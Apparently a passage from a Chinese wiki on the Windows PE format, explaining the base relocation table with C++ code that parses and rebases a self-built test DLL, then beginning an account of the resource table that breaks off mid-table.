假设有两个DLL文件，A.dll和B.dll，默认的加载基址都是0x10000000。如果A.dll首先加载并占据了0x10000000，随后当系统尝试加载B.dll时，由于该地址已被占用，系统只能将B.dll加载到另外一个不同的基地址。 加载基地址的改变不影响使用相对虚拟地址（RVA）的数据，因为RVA本身就是一个相对于ImageBase的偏移量，设计之初就是为了适应这种动态装配。然而，对于文件中硬编码的地址（即直接写入的实际内存地址），则需要进行地址修正。假设下面这段代码是一个exe或dll里的，有对数据区变量的引用。当编译器编译，其实就是把汇编指令的二进制数写到PE文件中。 12345678910#include &lt;stdio.h&gt;int x = 0x11;int main()&#123;\tprintf(&quot;%d &quot;,x);\treturn 0;&#125; 1234567: printf(&quot;%d &quot;,x);0040D408 A1 DC 4A 42 00 mov eax,[x (00424adc)]0040D40D 50 push eax0040D40E 68 80 2E 42 00 push offset string &quot;%d &quot; (00422e80)0040D413 E8 78 02 00 00 call printf (0040d690)0040D418 83 C4 08 add esp,8 像DC 4A 42 00（变量x）和80 2E 42 00（字符串&quot;%d &quot;）这个地址就是编译器编译时算的“写死”的地址（绝对地址），然后这个“写死”的地址（绝对地址）被写到PE文件里。 当这个PE文件在加载时，如果按照预设的ImageBase载入，上面对变量x和字符串的引用是没有问题的。如果这个PE文件加载时，没有按预设的ImageBase载入，而是从另外一个基址载入，程序执行时仍然按DC 4A 42 00和80 2E 42 00来使用这个值，这会导致程序出错。像这种“写死”的地址，就是需要修正的地方。 重定位表就是这样一张表：表中记录了当前PE文件中所有“写死”的需要修正的这些位置的地址。当这个PE文件未能从默认的加载基址载入，系统就可以通过重定位表中的信息，找到这些需要修正的地址进行修正，来确保模块的正确执行。 重定位表结构 从拓展PE头.数据目录表数据的第6个成员得到重定位数据的起始地址（这个值是RVA）和大小。 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 将RVA转为FOA后，找过去的就是重定位数据的起始地址。重定位数据是由一块一块的重定位块组成的。 每个重定位块都是以PIMAGE_BASE_RELOCATION结构体开头， 123456typedef struct _IMAGE_BASE_RELOCATION &#123; DWORD VirtualAddress; DWORD SizeOfBlock;// WORD TypeOffset[1];&#125; IMAGE_BASE_RELOCATION;typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; VirtualAddress：大小4字节。 SizeOfBlock：大小4字节。 TypeOffset：2字节大小的数组。 每个重定位块是不定长的，当前重定位块的大小由SizeOfBlock（单位：字节）指出。SizeOfBlock减去8字节（VirtualAddress和SizeOfBlock共占8字节空间）再/2就是TypeOffset数组的个数。 1(RelocationDirectory-&gt;SizeOfBlock - 8) / 2 怎么判断什么时候到重定位块的末尾？以全0的IMAGE_BASE_RELOCATION结构体（8字节全0）作为结束标志。 需要修正的数据的RVA地址是采用页基址+页内偏移的方式计算得到：VirtualAddress基址+TypeOffset数组成员中低12位。 注：TypeOffset数组成员高4位表示重定位类型，低12位表示偏移地址 重定位类型 含义 IMAGE_REL_BASED_ABSOLUTE 没有具体含义，只是为了让每个段4字节对齐 IMACE_REL_BASED_HIGHLOW 重定位指向的整个地址都需要修正，实际上大部分情况下都是这样的 IMAGE_REL_BASED_DIR64 出现在64位 PE 文件中，对指向的整个地址进行修正 在写代码时，要先判断数组每个成员的重定位类型： 只有重定位类型为IMACE_REL_BASED_HIGHLOW（值是3）的才需要进行修正 如果重定位类型是IMAGE_REL_BASED_ABSOLUTE，说明这个数组成员只是占个位置，目的是让重定位块按4字节对齐（按结构体对齐规则，以结构体中最宽的成员对齐，在IMAGE_BASE_RELOCATION结构体这个例子中最宽的成员是DWORD类型）。 为什么待修正的地址用这种方式表示？假设需要修正的数组的地址有：1230x80001230x80004560x8000789方案一：用一个DWORD数组来存123数组[0]=0x8000123;数组[1]=0x8000456;数组[2]=0x8000789;这种方案浪费空间。方案二：采用基址+偏移的方式按照保护模式中页式管理的知识，一个物理页4kb，寻址4kb需要12位0和1，即2^12次方。那么我们可以采用页基址+页内偏移的方式来表示最终需要修正的数据的地址12 DWORD VirtualAddress;// WORD TypeOffset[1];这种方案下，只有VirtualAddress占DOWRD大小的空间，页内偏移只需2字节表示，节省存储空间。另外，2字节相比12位多了4位，这四位也利用起来，用来表示重定位类型 打印重定位块 测试用的dll的源码是导出表-例那里的源码，分别用VC和VS编译得到的两个dll 函数实现测试函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253VOID PEManipulator::PrintReloactionTable()&#123; // 获取重定位表指针 auto pBaseReloc = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC); if (!pBaseReloc) &#123; printf(&quot; [-] No Base Relocation Table found. &quot;); return; &#125; int iBlockIndex = 0; // 第几个重定位块 while (pBaseReloc-&gt;VirtualAddress &amp;&amp; pBaseReloc-&gt;SizeOfBlock) &#123; printf(&quot; %d. Relocation Block: &quot;, iBlockIndex++); printf(&quot; VirtualAddress: 0x%08X &quot;, pBaseReloc-&gt;VirtualAddress); printf(&quot; SizeOfBlock: 0x%08X (%d block entries) &quot;, pBaseReloc-&gt;SizeOfBlock, (pBaseReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); // 对齐表头 printf(&quot;\\t Index Offset Type Full RVA FOA DataAtFOA &quot;); printf(&quot;\\t ------- ------------ ------------ ------------ ------------ ------------ &quot;); // 获取TypeOffset数组的指针 PWORD pTypeOffset = (PWORD)(pBaseReloc + 1); DWORD dwEntryCount = (pBaseReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (DWORD i = 0; i &lt; dwEntryCount; i++) &#123; WORD wType = pTypeOffset[i] &gt;&gt; 12; // 高4位是类型 WORD wOffset = pTypeOffset[i] &amp; 0x0FFF; // 低12位是偏移 DWORD dwFullRVA = pBaseReloc-&gt;VirtualAddress + wOffset; if (wType == IMAGE_REL_BASED_HIGHLOW) // 对于 HIGHLOW 类型 &#123; DWORD dwFullFOA = 0; if (!RVAToFOA(dwFullRVA, dwFullFOA)) &#123; return; &#125; DWORD dwDataAtFOA = *(PDWORD)((DWORD)m_lpFileBuffer + dwFullFOA); printf(&quot;\\t [%04d] 0x%08X HIGHLOW 0x%08X 0x%08X 0x%08X &quot;, i, wOffset, dwFullRVA, dwFullFOA, dwDataAtFOA); &#125; else if (wType == IMAGE_REL_BASED_ABSOLUTE) // 对于 ABSOLUTE 类型 &#123; printf(&quot;\\t n/a ABSOLUTE &quot;); &#125; &#125; // 移动到下一个重定位块 pBaseReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc + pBaseReloc-&gt;SizeOfBlock); &#125;&#125;测试函数1234567891011121314//测试打印重定位表int TestPrintReloactionTable()&#123; PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VC的 //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VS的 if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintReloactionTable(); return 0;&#125; 运行结果的部分截图： （第5个块的数量和Offset，与LordPE上显示的一样） Bug记录测VC编译的那个dll发现却打印不出来，调试发现是重定位表指针的值取到37000h，过去读，while表达式条件不成立，没进while循环，退出了。思考和解决的过程：VC编译的那个dll的文件对齐和内存对齐一样。说明不需要RVA==FOA数据目录表显示重定位表RVA是37000h但实际上37000h是文件末尾了继续点LordPE 重定位表的H按键，它打开的是35000h的十六进制界面疑问：它数据目录表里重定位表的RVA是37000h，指的地方是错的那LordPE是怎么找到正确的位置35000h的？答案：还是“拉伸”的问题，上面第一点“文件对齐和内存对齐一样。说明不需要RVA转FOA”这一点就是错的。因为一个节如果含有未初始化数据，会导致磁盘不占空间，内存时要空间，这个情况也会导致“拉伸”。然后再看了下代码，是RVAToFOA函数有问题，需要修改。把下面红框（文件对齐=内存对齐）的条件去掉。即使文件对齐==内存对齐，也要算节偏移修改后的RVAToFOA函数12345678910111213141516171819202122232425262728293031BOOL PEManipulator::RVAToFOA(DWORD dwRVA, OUT DWORD&amp; dwFOA)&#123; dwFOA = 0; // 初始化 dwFOA，防止warning if (dwRVA &lt; 0) //参数校验 &#123; return FALSE; &#125; //RVA在SizeOfHeaders以内 // 不能加FileAlignment==SectionAlignment这个条件，即使对齐相同，文件中的实际数据可能由于 SizeOfRawData 小于 VirtualSize 而不完整。 if (dwRVA &lt;= m_OptionalPeHdr-&gt;SizeOfHeaders ) &#123; dwFOA = dwRVA; return TRUE; &#125; //在节表中 for (int i = 0; i &lt; m_PeHdr-&gt;NumberOfSections; i++) &#123; if (m_SecHdr[i].VirtualAddress &lt;= dwRVA &amp;&amp; dwRVA &lt; m_SecHdr[i].VirtualAddress + m_SecHdr[i].Misc.VirtualSize) &#123; //节.PointerToRawData + 差值 //差值=RVA-节.VirtualAddress dwFOA = m_SecHdr[i].PointerToRawData + (dwRVA - m_SecHdr[i].VirtualAddress); return TRUE; &#125; &#125; return TRUE;&#125;如果更严谨点，输入的RVA在文件中可能是找不到的，即RVA超出了SizeOfRawData。所以算实际的FOA前，要判断下RVA是否超出了SizeOfRawData。12345678910111213141516171819202122232425262728293031323334353637383940BOOL PEManipulator::RVAToFOA(DWORD dwRVA, OUT DWORD&amp; dwFOA)&#123; dwFOA = 0; // 初始化 dwFOA，防止warning if (dwRVA &lt; 0) //参数校验 &#123; return FALSE; &#125; //RVA在SizeOfHeaders以内 // 不能加FileAlignment==SectionAlignment这个条件，即使对齐相同，文件中的实际数据可能由于 SizeOfRawData 小于 VirtualSize 而不完整。 if (dwRVA &lt;= m_OptionalPeHdr-&gt;SizeOfHeaders ) &#123; dwFOA = dwRVA; return TRUE; &#125; //在节表中 for (int i = 0; i &lt; m_PeHdr-&gt;NumberOfSections; i++) &#123; if (m_SecHdr[i].VirtualAddress &lt;= dwRVA &amp;&amp; dwRVA &lt; m_SecHdr[i].VirtualAddress + m_SecHdr[i].Misc.VirtualSize) &#123; // 检查RVA是否超出节的原始数据大小 if (dwRVA &gt;= m_SecHdr[i].VirtualAddress + m_SecHdr[i].SizeOfRawData) &#123; printf(&quot;[-] Error: RVA 0x%08X is beyond the raw data size of section %d. &quot;, dwRVA, i); return FALSE; &#125; //节.PointerToRawData + 差值 //差值=RVA-节.VirtualAddress dwFOA = m_SecHdr[i].PointerToRawData + (dwRVA - m_SecHdr[i].VirtualAddress); return TRUE; &#125; &#125; // 如果没有找到对应的节 printf(&quot;[-] Error: RVA 0x%08X does not correspond to any valid section. &quot;, dwRVA); return FALSE;&#125; 修复重定位数据 编程实现：根据重定位表去修复重定位数据。 制造需要修改的条件：修改Dll的ImageBase 验证是否修正成功：再次使用修改后的Dll，看这个Dll是否可以正常使用 测试用例： dll文件 备注 VC编译的dll 文件对齐1000h，内存对齐1000h VS编译的dll 文件对齐200h，内存对齐1000h 设计的流程大致如下： 先使用dll中的导出函数，确保dll能正常使用 修改这个dll的ImageBase为其他值，修复重定位数据，存盘 再使用修改后的dll中的导出函数，看是否能正常使用 步骤1和3都是使用dll中的导出函数，功能一样，写成一个函数，这个函数接收一个文件路径参数 1BOOL UseExportedFunctionsFromDLL(LPCSTR DllPath) 大致流程123456789101112131415161718192021222324252627282930313233343536//测试修复重定位表int TestFixRelocationTable()&#123; //1、正常使用dll中的导出函数 printf(&quot;[*] Using functions from DLL with original ImageBase... &quot;); UseExportedFunctionsFromDLL(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VC的 //UseExportedFunctionsFromDLL(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VS的 //2、 暂停，提示用户即将修改ImageBase和修复重定位数据 printf(&quot;[*] Press any key to modify the ImageBase to 0x30000000 and fix relocations... &quot;); getchar(); //3、修改ImageBase并修复重定位数据 PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VC的 //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VS的 if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; // 4、修改ImageBase并修复重定位数据 if (!PEFile.ChangeImageBaseAndFixRelocations(0x30000000)) &#123; printf(&quot;[-] Failed to change ImageBase and fix relocations. &quot;); return 1; &#125; // 5、暂停，提示用户即将尝试使用修改后的dll中的导出函数 printf(&quot;[+] Press any key to attempt using functions from the DLL after modifying ImageBase... &quot;); getchar(); UseExportedFunctionsFromDLL(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC_NewImageBase.dll&quot;); //VC的 //UseExportedFunctionsFromDLL(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll_NewImageBase.dll&quot;); //VS的 return 0;&#125; UseExportedFunctionsFromDLL使用dll中的导出函数ChangeImageBaseAndFixRelocations修改ImageBase+修正数据+存盘显式加载dll并使用里面的导出函数 LoadLibraryA就是将dll加载到进程空间中，如果用OD看的话，执行LoadLibraryA(DllPath)后，“E”按钮模块会多出加载的dll。这个dll加载基址是ImageBase（如果基址没有随机加载的话） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061BOOL UseExportedFunctionsFromDLL(LPCSTR DllPath)&#123; // 动态加载DLL到内存中 HMODULE hModule = LoadLibraryA(DllPath); if (hModule == NULL) &#123; printf(&quot;[!] Failed to load %s &quot;, DllPath); return FALSE; &#125; // 打印加载的DLL的基地址 printf(&quot;Loaded DLL at base address: 0x%p &quot;, hModule); // 获取并验证函数地址 fpPlus myPlus = (fpPlus)GetProcAddress(hModule, &quot;Plus&quot;); if (!myPlus) &#123; printf(&quot;[!] Failed to get the address of Plus &quot;); FreeLibrary(hModule); return FALSE; &#125; fpSub mySub = (fpSub)GetProcAddress(hModule, (LPCSTR)16); if (!mySub) &#123; printf(&quot;[!] Failed to get the address of Sub(NOMANE) &quot;); FreeLibrary(hModule); return FALSE; &#125; fpMul myMul = (fpMul)GetProcAddress(hModule, &quot;Mul&quot;); if (!myMul) &#123; printf(&quot;[!] Failed to get the address of Mul &quot;); FreeLibrary(hModule); return FALSE; &#125; fpDiv myDiv = (fpDiv)GetProcAddress(hModule, &quot;Div&quot;); if (!myDiv) &#123; printf(&quot;[!] Failed to get the address of Div &quot;); FreeLibrary(hModule); return FALSE; &#125; // 调用函数 int a = myPlus(10, 2); int b = mySub(10, 2); int c = myMul(10, 2); int d = myDiv(10, 2); printf(&quot;Results: &quot;); printf(&quot; Plus: %4d &quot;, a); printf(&quot; Sub (NONAME): %4d &quot;, b); printf(&quot; Mul: %4d &quot;, c); printf(&quot; Div: %4d &quot;, d); // 释放DLL FreeLibrary(hModule); return TRUE;&#125;ChangeImageBaseAndFixRelocations函数实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869BOOL PEManipulator::ChangeImageBaseAndFixRelocations(DWORD dwNewImageBase)&#123; //1、申请一块NewBuffer，将FileBuffer原封不动拷过去 DWORD dwOriginalBufferSize = CalculateUnstretchedPESize(); LPVOID lpNewBuffer = new BYTE[dwOriginalBufferSize](); //since C++11 ,it&#x27;s ok printf(&quot;[+] new for NewBuffer successfully. &quot;); memcpy(lpNewBuffer, m_lpFileBuffer, dwOriginalBufferSize); printf(&quot;[+] Allocated and copied original PE to new buffer. &quot;); //2、在NewBuffer基础上修改ImageBase，并修正重定位数据 // 修改PE头中的ImageBase PIMAGE_OPTIONAL_HEADER32 pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); if (!pOptionalPeHdr_NewBuffer) &#123; delete[] lpNewBuffer; return FALSE; &#125; DWORD dwOldImageBase = pOptionalPeHdr_NewBuffer-&gt;ImageBase; pOptionalPeHdr_NewBuffer-&gt;ImageBase = dwNewImageBase; printf(&quot;[*] Changed ImageBase from 0x%08X to 0x%08X. &quot;, dwOldImageBase, dwNewImageBase); // 修复重定位数据 auto pBaseReloc_NewBuffer = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC, lpNewBuffer); if (!pBaseReloc_NewBuffer) &#123; delete[] lpNewBuffer; printf(&quot; [-] No Base Relocation Table found. &quot;); return FALSE; &#125; int iBlockIndex = 0; // 第几个重定位块 while (pBaseReloc_NewBuffer-&gt;VirtualAddress &amp;&amp; pBaseReloc_NewBuffer-&gt;SizeOfBlock) &#123; iBlockIndex++; // 调试用 PWORD pTypeOffset = (PWORD)(pBaseReloc_NewBuffer + 1); //TypeOffset数组的指针 DWORD dwEntryCount = (pBaseReloc_NewBuffer-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (DWORD i = 0; i &lt; dwEntryCount; i++) &#123; DWORD wType = pTypeOffset[i] &gt;&gt; 12; //高4位是类型 DWORD wOffset = pTypeOffset[i] &amp; 0x0FFF; //低12位是偏移 if (wType == IMAGE_REL_BASED_HIGHLOW) // 对于 HIGHLOW 类型是数据，进行修正 &#123; DWORD dwFullRVA = pBaseReloc_NewBuffer-&gt;VirtualAddress + wOffset; DWORD dwFullFOA = 0; if (!RVAToFOA(dwFullRVA, dwFullFOA)) &#123; delete[] lpNewBuffer; return FALSE; &#125; //修正数据 auto pPatchAddr = (PDWORD)((DWORD)lpNewBuffer + dwFullFOA); *pPatchAddr = *pPatchAddr - dwOldImageBase + dwNewImageBase; &#125; &#125; //下一个重定位块 pBaseReloc_NewBuffer = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc_NewBuffer + pBaseReloc_NewBuffer-&gt;SizeOfBlock); &#125; //3、 保存修改后的内存到新文件中 if (!SaveUnstretchedPEToDisk(lpNewBuffer, &quot;NewImageBase&quot;)) &#123; return FALSE; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return TRUE;&#125; 讲解如下： PEManipulator类中新增一个函数ChangeImageBaseAndFixRelocations，负责修改dll中ImageBase并存盘 1BOOL ChangeImageBaseAndFixRelocations(DWORD dwNewImageBase); ChangeImageBaseAndFixRelocations函数实现步骤为： 先申请一块NewBuffer，将原文件内存映像拷过去 在NewBuffer的基础上修改ImageBase，并根据重定位表修正重定位数据 存盘 每一步的实现如下： 申请NewBuffer并拷贝原数据 123456//1、申请一块NewBuffer，将FileBuffer原封不动拷过去DWORD dwOriginalBufferSize = CalculateUnstretchedPESize();LPVOID lpNewBuffer = new BYTE[dwOriginalBufferSize](); //since C++11 ,it&#x27;s okprintf(&quot;[+] new for NewBuffer successfully. &quot;);memcpy(lpNewBuffer, m_lpFileBuffer, dwOriginalBufferSize);printf(&quot;[+] Allocated and copied original PE to new buffer. &quot;); 修改ImageBase 后面修正数据时要用到旧的ImageBase，所以要用个变量存一下。否则ImageBase修改为新的，后面用pOptionalPeHdr_NewBuffer-&gt;ImageBase这个就是新的ImageBase的值了 1234567891011//2、在NewBuffer基础上修改ImageBase，并修正重定位数据 // 修改PE头中的ImageBasePIMAGE_OPTIONAL_HEADER32 pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer);if (!pOptionalPeHdr_NewBuffer)&#123; delete[] lpNewBuffer; return FALSE;&#125;DWORD dwOldImageBase = pOptionalPeHdr_NewBuffer-&gt;ImageBase;pOptionalPeHdr_NewBuffer-&gt;ImageBase = dwNewImageBase;printf(&quot;[*] Changed ImageBase from 0x%08X to 0x%08X. &quot;, dwOldImageBase, dwNewImageBase); 修正重定位数据 1234567891011121314151617181920212223242526272829303132333435363738 // 修复重定位数据auto pBaseReloc_NewBuffer = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC, lpNewBuffer);if (!pBaseReloc_NewBuffer)&#123; delete[] lpNewBuffer; printf(&quot; [-] No Base Relocation Table found. &quot;); return FALSE;&#125;int iBlockIndex = 0; // 第几个重定位块 while (pBaseReloc_NewBuffer-&gt;VirtualAddress &amp;&amp; pBaseReloc_NewBuffer-&gt;SizeOfBlock)&#123; iBlockIndex++; // 调试用 PWORD pTypeOffset = (PWORD)(pBaseReloc_NewBuffer + 1); //TypeOffset数组的指针 DWORD dwEntryCount = (pBaseReloc_NewBuffer-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (DWORD i = 0; i &lt; dwEntryCount; i++) &#123; DWORD wType = pTypeOffset[i] &gt;&gt; 12; //高4位是类型 DWORD wOffset = pTypeOffset[i] &amp; 0x0FFF; //低12位是偏移 if (wType == IMAGE_REL_BASED_HIGHLOW) // 对于 HIGHLOW 类型是数据，进行修正 &#123; DWORD dwFullRVA = pBaseReloc_NewBuffer-&gt;VirtualAddress + wOffset; DWORD dwFullFOA = 0; if (!RVAToFOA(dwFullRVA, dwFullFOA)) &#123; delete[] lpNewBuffer; return FALSE; &#125; //修正数据 auto pPatchAddr = (PDWORD)((DWORD)lpNewBuffer + dwFullFOA); *pPatchAddr = *pPatchAddr - dwOldImageBase + dwNewImageBase; &#125; &#125; //下一个重定位块 pBaseReloc_NewBuffer = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc_NewBuffer + pBaseReloc_NewBuffer-&gt;SizeOfBlock);&#125; 这里提下修正数据那里 123456789101112131415假设原来的ImageBase是0x10000000写死的地址是0x10003456现在新的ImageBase是0x20000000那么这样改： 1、让写死的地址减去原ImageBase 2、再加上新ImageBase （不用想着先算新ImageBase和原ImageBase差值正数还是负数，什么补码什么的）即： 0x10003456-0x10000000+0x20000000代码就是 *pPatchAddr = *pPatchAddr - dwOldImageBase + dwNewImageBase; 存盘 123456//3、 保存修改后的内存到新文件中if (!SaveUnstretchedPEToDisk(lpNewBuffer, &quot;NewImageBase&quot;))&#123; return FALSE;&#125;printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); 运行 VC的dllVS的dllVS编译的dll需要给PE头里Characteristics加上IMAGE_FILE_RELOCS_STRIPPED属性，表示文件中不存在重定位信息，这样这个dll加载时会强制按ImageBase加载。否则加载基址是随机的，也就是说，即使程序将它的基址修改然后修正了数据，结果人家加载进exe时随机选了个地址，由系统又修正了一遍。 这样就可以了"},{"title":"资源表","path":"/wiki/PE/资源表.html","content":"前言 在写界面程序时，比如在win32那里我们用资源文件的方式来创建图标，那么一个程序中各种界面上的资源在exe中的哪里？资源表就是用于描述exe中这些资源信息的一张表。 草稿：比如“菜单”资源类型下，可能有“IDM_OPEN”（ID号为2001），“IDM_EXIT”（ID号为2002）等菜单项。 资源结构 资源结构类似于磁盘文件系统，文件夹下有文件夹，文件夹下还有文件夹，文件夹下的文件就是真正的资源数据。 资源结构由一层一层的资源目录块/节点/资源目录结构单元组成。每个目录块/节点由资源目录头和紧随其后的资源目录项组成（它有几项是不确定的，所以需要用一个目录来描述）。资源结构从设计上来说，理论上支持n多层。但一般情况下，是三层，第一层表示资源的类型，第二层按资源的ID分类，第三层按资源的代码页分类，第三层后是“文件”，这里的“文件”是指通过OffsetToData指过来后的地方，对所有资源数据块的解析和访问就从这里开始。每一层的节点都是资源目录块这个数据结构，而在不同层级，这个资源目录块中字段的含义是不一样的。（后面会讲） 资源表图示（整体结构）资源表图示（详细版） 从拓展PE头.数据目录表数据的第3个成员得到资源表的起始地址（这个值是RVA）和大小。 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 将RVA转为FOA后，找过去的是第一级的资源目录块。 资源目录头123456789typedef struct _IMAGE_RESOURCE_DIRECTORY &#123; DWORD Characteristics; // 资源属性 保留 为0 DWORD TimeDateStamp; // 创建该资源的时间 WORD MajorVersion; // 资源版本号。未使用，为0 WORD MinorVersion; // 资源版本号。未使用，为0 WORD NumberOfNamedEntries; // 以名称命名的资源个数 WORD NumberOfIdEntries; // 以ID命名的资源个数// IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY; 资源目录头IMAGE_RESOURCE_DIRECTORY中最重要的字段是NumberOfNamedEntries和NumberOfIdEntries，它俩之和的数量，就是紧随其后资源目录项的数量。 在.rc中定义资源时，既可以用字符串名称来标识一个资源，也可以用ID号来标识一个资源。 在代码中使用资源时，既可以用字符串名称来使用一个资源，也可以用ID号来使用一个资源。 那么在资源目录头这里的字段，就对应上了，NumberOfNamedEntries用于表示以名称命名的资源个数，NumberOfIdEntries用于表示以ID命名的资源个数。 资源目录项跟在资源目录头后面首先按照字母升序(不分大小写）排列名称资源目录项，然后再按ID升序排列ID资源目录项。 每个资源目录项是一个IMAGE_RESOURCE_DIRECTORY_ENTRY结构。 资源目录项1234567891011121314151617typedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY &#123; union &#123; struct &#123; DWORD NameOffset:31; DWORD NameIsString:1; &#125; DUMMYSTRUCTNAME; DWORD Name; WORD Id; &#125; DUMMYUNIONNAME; union &#123; DWORD OffsetToData; struct &#123; DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; &#125; DUMMYSTRUCTNAME2; &#125; DUMMYUNIONNAME2;&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; union+位域之前在学习导入表时，对于INT表或IAT表表项（还没替换为函数地址），每个表项可以是一个序号或一个指向HintName的RVA指针，这取决于表项的最高位是1还是0。当这个DWORD值最高位为1，表示函数以序号方式导入。此时低31位表示一个函数序号。当这个DWORD值最高位为0，表示函数以函数名方式导入。此时这个DWORD值是一个指向IMAGE_IMPORT_BY_NAME结构的RVA地址。编程时用位运算取最高位进行区分的代码逻辑大致如下：123456789//假设这个是INT表表项的结构typedef struct _IMAGE_THUNK_DATA32 &#123;\tDWORD Item;&#125; IMAGE_THUNK_DATA32;if (*pINTTable &amp; 0x80000000) //最高位为1&#123;\t//...&#125;为了方便这种区分，可以用位域（bit-fields）+union结构。具体做法是，加一个位域（bit-fields）结构体，里面分别用两个字段表示这个DWORD的最高位和低31位，外面再用union包起来（这样没有改变原结构体的大小），那么在代码中就不需要自己用位运算，直接判断IsOrdinal的值即可，代码示意如下：1234567891011121314151617typedef struct _IMAGE_THUNK_DATA32 &#123;\tunion &#123; struct &#123; DWORD pHintNameItem : 31; // IsOrdinal为1时，pHintNameItem指向提示名表；IsOrdinal为0时，pHintNameItem是个序号 DWORD IsOrdinal : 1; // 最高位，标识是否为序号导入 &#125; u1; DWORD Item; // 完整的DWORD表项\t&#125; u0;&#125; IMAGE_THUNK_DATA32;IMAGE_THUNK_DATA32* pINTTable;if (pINTTable-&gt;u0.u1.IsOrdinal) // 最高位为1，表示序号导入&#123;\t// ...&#125;用上了位域，看反汇编代码的话其实就是位运算，编译器帮我们写的，就不用我们自己写了 IMAGE_RESOURCE_DIRECTORY_ENTRY结构体由两个Union结构组成，共8字节大小。 第一个union结构 当NameIsString（最高位）为0，使用Id字段，表示是一个编号 当NameIsString（最高位）为1，使用NameOffset字段，NameOffset（即低31位）是一个指向IMAGE_RESOURCE_DIR_STRING_U结构体的指针，这个偏移值是相对于资源表的起始位置（即数据目录表中描述资源表.VirtualSize字段） 在资源中，对字符串的定义使用的是Unicode编码，IMAGE_RESOURCE_DIR_STRING_U结构描述这个Unicode字符串。 1234typedef struct _IMAGE_RESOURCE_DIR_STRING_U &#123; WORD Length; // 描述字符串长度 WCHAR NameString[ 1 ];&#125; IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U; 对于Unicode字符串，以0作为一个字符串结尾的方式不科学。所以这里用Length记录这个字符串的长度 第二个union结构 当DataIsDirectory（最高位）为0，使用OffsetToData字段，OffsetToData指向资源数据项IMAGE_RESOURCE_DATA_ENTRY，资源数据项用于描述资源数据的位置和大小。OffsetToData字段的偏移是相对于资源表的起始位置（即数据目录表中描述资源表.VirtualSize字段） DataIsDirector=0，通常出现在第三级目录 当DataIsDirectory（最高位）为1，使用OffsetToDirectory字段，OffsetToDirectory（即低31位）指向下一个资源目录的起始地址 注：NameOffset和OffsetToData字段的偏移都是相对于资源表的起始位置（即数据目录表中描述资源表.VirtualSize字段） 资源数据项123456typedef struct _IMAGE_RESOURCE_DATA_ENTRY &#123; DWORD OffsetToData; // 资源数据的RVA地址 DWORD Size; // 资源数据的长度 DWORD CodePage; // 代码页，一般为0 DWORD Reserved; // 保留字段&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY; OffsetToData：指向的还不是赤裸裸资源信息的二进制数据，而是附加了一些数据结构的资源快。如果想将资源中的ico图扣出来，通过OffsetToData指过去后，继续查图标组资源解析的资料得知怎么继续解析；如果想将对话框扣出来，继续查对话框资源解析的资料得知怎么继续解析。这里不做介绍 不同层级下资源目录项字段的不同含义 三层层级中每个节点的资源目录项都是用IMAGE_RESOURCE_DIRECTORY_ENTRY结构体表示，但它们在不同层级时，资源目录项中字段的含义是不一样的。 IMAGE_RESOURCE_DATA_ENTRY中第一个Union字段 在第一层中，资源目录块表示资源类型。资源目录项中的Name字段表示这是标准的资源类型还是非标准的。id数值在1-16之间就是系统预定义的标准资源类型。 最高位为1，使用NameOffset字段，NameOffset指向IMAGE_RESOURCE_DIR_STRING_U结构。字符串为非标准的类型的名字。 最高位为0，使用Id字段。 常量符号 数值 含义 RT_CURSOR 1 光标（Cusor） RT_BITMAP 2 